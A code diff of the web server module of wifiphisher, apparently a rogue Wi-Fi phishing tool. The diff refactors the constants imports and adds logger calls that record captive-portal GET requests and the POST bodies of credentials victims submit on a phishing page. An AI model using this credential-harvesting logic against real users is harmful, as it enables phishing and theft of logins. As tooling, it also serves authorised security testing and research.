@@ -6,7 +6,8 @@ import tornado.web
 import os.path
 import wifiphisher.common.uimethods as uimethods
 import wifiphisher.common.extensions as extensions
-from wifiphisher.common.constants import *
+import wifiphisher.common.constants as constants
+
 
 hn = logging.NullHandler()
 hn.setLevel(logging.DEBUG)
@@ -16,6 +17,7 @@ logging.getLogger('tornado.general').disabled = True
 template = False
 terminate = False
 creds = []
+logger = logging.getLogger(__name__)
 
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
@@ -96,6 +98,9 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         with open(log_file_path, "a+") as log_file:
             log_file.write("GET request from {0} for {1}\n".format(
                 self.request.remote_ip, self.request.full_url()))
+        # record the GET request in the logging file
+        logger.info("GET request from %s for %s",
+                self.request.remote_ip, self.request.full_url())
 
     def post(self):
         """
@@ -118,13 +123,16 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
             return
 
         # check if this is a valid phishing post request
-        if content_type.startswith(VALID_POST_CONTENT_TYPE):
+        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
             post_data = tornado.escape.url_unescape(self.request.body)
             # log the data
             log_file_path = "/tmp/wifiphisher-webserver.tmp"
             with open(log_file_path, "a+") as log_file:
                 log_file.write("POST request from {0} with {1}\n".format(
                     self.request.remote_ip, post_data))
+                # record the post requests in the logging file
+                logger.info("POST request from %s with %s",
+                            self.request.remote_ip, post_data)
 
             creds.append(post_data)
             terminate = True
@@ -156,8 +164,8 @@ def runHTTPServer(ip, port, ssl_port, t, em):
         ]
     )
     https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
-        "certfile": PEM,
-        "keyfile": PEM,
+        "certfile": constants.PEM,
+        "keyfile": constants.PEM,
     })
     https_server.listen(ssl_port, address=ip)
 
